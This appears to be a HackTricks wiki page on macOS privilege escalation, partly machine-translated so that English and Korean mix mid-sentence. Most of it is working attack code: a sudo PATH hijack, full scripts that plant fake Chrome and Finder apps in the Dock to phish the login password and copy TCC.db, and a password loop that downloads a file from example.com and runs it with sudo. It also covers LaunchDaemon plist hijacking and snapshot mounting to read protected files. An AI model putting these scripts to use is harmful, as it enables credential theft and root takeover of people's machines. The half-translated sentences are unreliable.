# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

If you came here looking for TCC privilege escalation go to:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

참고: **most of the tricks about privilege escalation affecting Linux/Unix will affect also MacOS** 시스템에도 영향을 줍니다. 다음을 참조하세요:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## 사용자 상호작용

### Sudo Hijacking

원본 [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking)를 확인할 수 있습니다.

그러나 macOS는 사용자가 **`sudo`**를 실행할 때 사용자의 **`PATH`**를 **유지**합니다. 이는 이 공격을 달성하는 또 다른 방법이 피해자가 **running sudo**할 때 실행할 다른 바이너리를 **hijack other binaries**하는 것임을 의미합니다:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Note that a user that uses the terminal will highly probable have **Homebrew installed**. So it's possible to hijack binaries in **`/opt/homebrew/bin`**.

### Dock 사칭

Using some **social engineering** you could **impersonate for example Google Chrome** inside the dock and actually execute your own script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
몇 가지 제안:

- Dock에서 Chrome이 있는지 확인하고, 있는 경우 해당 항목을 **제거**한 후 Dock 배열의 동일한 위치에 **가짜 Chrome 항목을 추가**하세요.

<details>
<summary>Chrome Dock 사칭 스크립트</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
몇 가지 제안:

- Finder는 **Dock에서 제거할 수 없습니다**, 따라서 Dock에 추가하려면 가짜 Finder를 실제 Finder 바로 옆에 둘 수 있습니다. 이를 위해서는 **Dock 배열의 맨 앞에 가짜 Finder 항목을 추가**해야 합니다.
- 다른 옵션은 Dock에 추가하지 않고 그냥 열기입니다. "Finder가 Finder를 제어하려고 합니다"와 같은 메시지는 그리 이상하지 않습니다.
- 또 다른 옵션은 끔찍한 인증 창 없이 비밀번호를 묻지 않고 **escalate to root without asking** 하는 것이 아니라, Finder가 권한이 필요한 작업을 수행할 때 실제로 비밀번호를 묻도록 만드는 것입니다:
- Finder에게 **`/etc/pam.d`**에 새로운 **`sudo`** 파일을 복사하도록 요청하세요 (비밀번호 입력을 요구하는 프롬프트에는 "Finder wants to copy sudo"라고 표시됩니다)
- Finder에게 새로운 **Authorization Plugin**을 복사하도록 요청하세요 (파일 이름을 제어하면 비밀번호를 묻는 프롬프트에 "Finder wants to copy Finder.bundle"이라고 표시되게 할 수 있습니다)

<details>
<summary>Finder Dock 사칭 스크립트</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

멀웨어는 종종 사용자 상호작용을 악용하여 **sudo-capable password**를 캡처하고 프로그래밍적으로 재사용합니다. 일반적인 흐름:

1. 로그인한 사용자를 `whoami`로 확인합니다.
2. **Loop password prompts** — `dscl . -authonly "$user" "$pw"`가 성공을 반환할 때까지 반복합니다.
3. 자격 증명(예: `/tmp/.pass`)을 캐시하고 `sudo -S` (password over stdin)를 사용해 권한 있는 작업을 수행합니다.

Example minimal chain:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
탈취한 비밀번호는 이후 재사용되어 **clear Gatekeeper quarantine with `xattr -c`**, LaunchDaemons 또는 기타 권한이 필요한 파일을 복사하고 추가 단계를 비대화식으로 실행할 수 있습니다.

## 최신 macOS 특정 벡터 (2023–2025)

### 더 이상 권장되지 않는 `AuthorizationExecuteWithPrivileges`는 여전히 사용 가능

`AuthorizationExecuteWithPrivileges`는 10.7에서 더 이상 권장되지 않았지만 **Sonoma/Sequoia에서 여전히 작동합니다**. 많은 상용 업데이트 프로그램이 `/usr/libexec/security_authtrampoline`을(를) 신뢰할 수 없는 경로와 함께 호출합니다. 대상 바이너리가 user-writable인 경우 trojan을 심고 정당한 프롬프트를 악용할 수 있습니다:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
신뢰할 수 있는 암호 입력 창을 표시하려면 **masquerading tricks above**와 결합하세요.

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

LaunchDaemon plist 또는 그 `ProgramArguments` 대상이 **user-writable**이면, 이를 교체한 다음 launchd가 다시 로드하도록 강제하여 권한을 상승시킬 수 있습니다:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
This mirrors the exploit pattern published for **CVE-2025-24085**, where a writable plist was abused to execute attacker code as root.

### XNU SMR credential race (CVE-2025-24118)

A **race in `kauth_cred_proc_update`** lets a local attacker corrupt the read-only credential pointer (`proc_ro.p_ucred`) by racing `setgid()`/`getgid()` loops across threads until a torn `memcpy` occurs. Successful corruption yields **uid 0** and kernel memory access. Minimal PoC structure:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Couple with heap grooming to land controlled data where the pointer re-reads. On vulnerable builds this is a reliable **local kernel privesc** without SIP bypass requirements.

### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)

If you already have root, SIP still blocks writes to system locations. The **Migraine** bug abuses the Migration Assistant entitlement `com.apple.rootless.install.heritable` to spawn a child process that inherits SIP bypass and overwrites protected paths (e.g., `/System/Library/LaunchDaemons`). The chain:

1. Obtain root on a live system.
2. Trigger `systemmigrationd` with crafted state to run an attacker-controlled binary.
3. Use inherited entitlement to patch SIP-protected files, persisting even after reboot.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Multiple Apple daemons accept **NSPredicate** objects over XPC and only validate the `expressionType` field, which is attacker-controlled. By crafting a predicate that evaluates arbitrary selectors you can achieve **code execution in root/system XPC services** (e.g., `coreduetd`, `contextstored`). When combined with an initial app sandbox escape, this grants **privilege escalation without user prompts**. Look for XPC endpoints that deserialize predicates and lack a robust visitor.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Any user** (even unprivileged ones) can create and mount a time machine snapshot an **access ALL the files** of that snapshot.\
The **only privileged** needed is for the application used (like `Terminal`) to have **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) which need to be granted by an admin.

<details>
<summary>Time Machine 스냅샷 마운트</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

더 자세한 설명은 [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## 민감한 정보

이는 권한 상승에 유용할 수 있습니다:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## 참고자료

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)

{{#include ../../banners/hacktricks-training.md}}
